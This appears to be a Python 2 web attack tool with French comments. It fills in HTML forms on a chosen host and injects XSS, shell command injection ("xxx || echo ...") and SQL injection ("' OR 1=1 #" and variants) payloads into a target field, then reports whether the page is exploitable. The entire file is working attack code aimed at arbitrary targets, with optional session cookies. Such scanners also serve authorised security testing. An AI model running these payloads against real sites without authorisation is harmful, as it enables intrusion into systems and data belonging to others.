#! /usr/bin/env python
# -*- coding: utf-8 -*-

from http import *

import urllib
import os

class FormAttack():
    def __init__(self, host, page, cookie = None):
        self.target = HTTP(host, header = {'Cookie': cookie} if cookie else {})
        self.page = page

    def selectForms(self, forms):
        """
            Identifie les formulaires contenant un champs portant le nom de celui
            que l'on cible. Si le champs porte un nom comme 'name' ou 'email', il
            est probable d'avoir plusieurs formulaires qui correspondent.
        """

        selected_forms = []

        # Looking for forms where the targeted field exists.
        for form in forms:
            if (self.fieldname in form['inputs']) or self.fieldname == None:
                selected_forms.append(form)

        # If more than one form is found, printing forms and asking to the user which one to use.
        if len(selected_forms) > 1:
            self.printForms(selected_forms)
            id = -1
            while id < 0 or id > len(selected_forms):
                id = input('Plusieurs formulaires affichés ci-dessus ont été trouvés.\nMerci de spécifier celui à utiliser (rentrer un l\'ID entre 0 et ' + str(len(selected_forms) - 1) + ') ? ')
        # If no form is found, stop the attack.
        elif len(selected_forms) == 0:
            print "Aucun formulaire contenant un champ '" + self.fieldname + "'. Abandon."
            return None
        # If only one form, selecting this one
        else: id = 0

        return selected_forms[id]

    def printForms(self, forms):
        """
            Affichage des champs principaux d'un formulaire.
        """

        for i in range(len(forms)):
            print "Form ID: ", i
            print "Method: ", forms[i]['method']
            print "Action: ", forms[i]['action']
            print "Inputs:"
            for j in forms[i]['inputs']: print '\t- ', j, ': ', forms[i]['inputs'][j]['type'], forms[i]['inputs'][j]
            print '\n\n'

    def fillForm(self, form, fv={}):
        """
            Remplit un formulaire en fonction des paramètres/valeures spécifiés en argument du programme.
        """

        data = {}
        for name in form['inputs']:
            inp = form['inputs'][name]

            # Unused inputs -> continue
            if not 'name' in inp: continue
            if inp['type'] in ['reset']: continue

            if name in fv:              # If value specified in program arguments (fv), use it.
                data[name] = fv[name]
            elif 'value' in inp:        # If a default value is presetted, keep this value
                data[inp['name']] = inp['value']
                continue
            # Filling some specific and required input types, if not required leave it blank
            elif inp['type'] in ['text', 'password', 'url', 'search', 'textarea']:
                if self.fieldname == None: data[name] = self.PAYLOAD
                elif 'required' in inp: data[name] = "xss testing"
                else: data[name] = ""
            else: data[name] = ""

        # Inserting payload (overwritting) the target input
        # Payload can be a SQL injection, an XSS, a CRSF
        if self.fieldname: data[self.fieldname] = self.PAYLOAD
        return data

    def run(self, fieldname, fieldvalue = {}):
        """
            Execute une attaque en injectant un charge (injection SQL ou autre) dans un formulaire
            puis récupère la réponse du formulaire
        """

        # Fetching target page and verifying that it is a successful request
        targetPage = self.target.GET(self.page)
        if targetPage['code'] != 200:
            print "Impossible de récupérer la page cible - erreur", targetPage['Code']
            return -1

        # Writing the target field/input name as an object variable
        self.fieldname = fieldname

        # Selecting the targeted form in the target page
        form = self.selectForms(self.target.getForms(self.page))
        if not form: return -1   # In case no form is found, selectForm will return 0

        # Filling and url enconding form data
        formdata = urllib.urlencode(self.fillForm(form, fieldvalue))

        # Detecting where to send the form
        if (not 'action' in form) or form['action'] in ['', '#']: form_dest = self.page
        else: form_dest = os.path.normpath(os.path.join(os.path.dirname(self.page), form['action']))

        # Sending the form in a POST or a GET request
        if form['method'].lower() == 'post': out = self.target.POST(form_dest, data=formdata)
        elif form['method'].lower() == 'get': out = self.target.GET(form_dest + '?' + formdata)

        # Return the POST or GET reply
        return out


class XSS(FormAttack):
    PAYLOAD = "<a onmouseover=\"alert('" + getUniqueID() + "')\">x</a>"

    def run(self, fieldname, fieldvalue = {}):

        # Calling FormAttack run method
        out = FormAttack.run(self, fieldname, fieldvalue)
        if out == -1: return False    # If attack is aborted for any reason, it will return -1

        if XSS.PAYLOAD in out['data']:
            print "Faille XSS exploitable sur " + os.path.join(self.target.host, self.page)
            return True
        else:
            print "Faille XSS non exploitable sur " + os.path.join(self.target.host, self.page)
            return False

class CommandInjection(FormAttack):
    PAYLOAD = "xxx || echo 'COMMAND_INJECTION_WORK'"

    def run(self, fieldname, fieldvalue = {}):

        # Calling FormAttack run method
        out = FormAttack.run(self, fieldname, fieldvalue)
        if out == -1: return False    # If attack is aborted for any reason, it will return -1

        if 'COMMAND_INJECTION_WORK' in out['data']:
            print "Injection de commande exploitable sur " + os.path.join(self.target.host, self.page)
            return True
        else:
            print "Injection de commande non exploitable sur " + os.path.join(self.target.host, self.page)
            return False

class SQLInjection(FormAttack):
    PAYLOAD = "' OR 1=1 #"
    TEST = ['\' OR SQL_INJECTION_WORK ; #', '" OR SQL_INJECTION_WORK ; #', '1 OR SQL_INJECTION_WORK ; #']

    ###
    ### How to verify that a SQL injection works ??
    ###
    def success(self, result):
        return ('Unknown column' in result and 'SQL_INJECTION_WORK' in result) or ('You have an error in your SQL syntax' in result)

    def run(self, fieldname, fieldvalue = {}):

        for injection in SQLInjection.TEST:
            SQLInjection.PAYLOAD = injection

            # Calling FormAttack run method
            out = FormAttack.run(self, fieldname, fieldvalue)
            if out == -1: continue    # If attack is aborted for any reason, it will return -1
            elif self.success(out['data']):
                print "Injection SQL exploitable sur " + os.path.join(self.target.host, self.page)
                return True


        if out != -1:
            print "Injection SQL non exploitable sur " + os.path.join(self.target.host, self.page)
            return False

        return False
